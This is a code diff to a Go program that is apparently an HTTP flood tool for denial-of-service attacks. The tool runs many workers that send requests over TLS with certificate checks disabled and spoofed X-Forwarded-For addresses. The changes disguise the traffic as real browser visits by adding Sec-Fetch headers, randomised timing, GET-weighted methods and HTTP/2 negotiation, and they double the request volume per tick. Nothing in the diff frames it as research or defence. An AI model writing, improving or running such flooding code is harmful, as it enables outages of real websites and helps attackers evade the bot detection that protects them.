@@ -22,8 +22,8 @@ var (
     threads       int
     timer         int
     customHost    string
-    httpMethods   = []string{"GET", "POST", "HEAD"} // Random HTTP methods
-	languages   = []string{"en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9"}
+    httpMethods   = []string{"GET", "GET", "GET", "POST", "HEAD"} // Random HTTP methods
+    languages   = []string{"en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9"}
     contentTypes = []string{
         "application/x-www-form-urlencoded",
         "application/json",
@@ -137,10 +137,13 @@ func getHeader(method string) (string, []byte) {
     fmt.Fprintf(&headerBuilder, "User-Agent: %s\r\n", getUserAgent())
     headerBuilder.WriteString("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n")
     headerBuilder.WriteString("Accept-Encoding: gzip, deflate, br, zstd\r\n")
-    
     // Randomized headers
     fmt.Fprintf(&headerBuilder, "Accept-Language: %s\r\n", languages[rand.Intn(len(languages))])
-    
+    headerBuilder.WriteString("Sec-Fetch-Site: none\r\n")
+    headerBuilder.WriteString("Sec-Fetch-Mode: navigate\r\n")
+    headerBuilder.WriteString("Sec-Fetch-User: ?1\r\n")
+    headerBuilder.WriteString("Sec-Fetch-Dest: document\r\n")
+    headerBuilder.WriteString("Upgrade-Insecure-Requests: 1\r\n")
     // Efficient X-Forwarded-For generation
     var ipBuilder [4]byte
     for i := range ipBuilder {
@@ -203,12 +206,12 @@ func worker(id int, wg *sync.WaitGroup, requestCount chan int) {
     tlsConfig := &tls.Config{
         ServerName:         hostHeader,
         InsecureSkipVerify: true, // Set to true only if necessary
+        NextProtos: []string{"h2", "http/1.1"}, // Prioritize HTTP/2
     }
     
     method := httpMethods[rand.Intn(len(httpMethods))] // Pick a random method per worker
     for count := range requestCount {
         for {
-            header, body := getHeader(method)
             randomIP := ips[rand.Intn(len(ips))] // Pick a random resolved IP
             address := fmt.Sprintf("%s:%d", randomIP, port)
 
@@ -227,6 +230,7 @@ func worker(id int, wg *sync.WaitGroup, requestCount chan int) {
             }
 
             for i := 0; i < count; i++ {
+                header, body := getHeader(method)
                 _, err := conn.Write([]byte(header))
                 if err != nil {
                     fmt.Printf("Worker %d: write error: %v\n", id, err)
@@ -238,6 +242,7 @@ func worker(id int, wg *sync.WaitGroup, requestCount chan int) {
                         fmt.Printf("Worker %d: write error: %v\n", id, err)
                         break
                     }
+                time.Sleep(time.Duration(rand.Intn(251)+50) * time.Millisecond)// Random delay between 50ms to 250ms
                 }
             }
             conn.Close()
@@ -300,7 +305,7 @@ func main() {
         for t := 0; t < timer; t++ {
             <-ticker.C
             for i := 0; i < threads; i++ {
-                requestCount <- 400
+                requestCount <- 800
             }
         }
         close(requestCount)
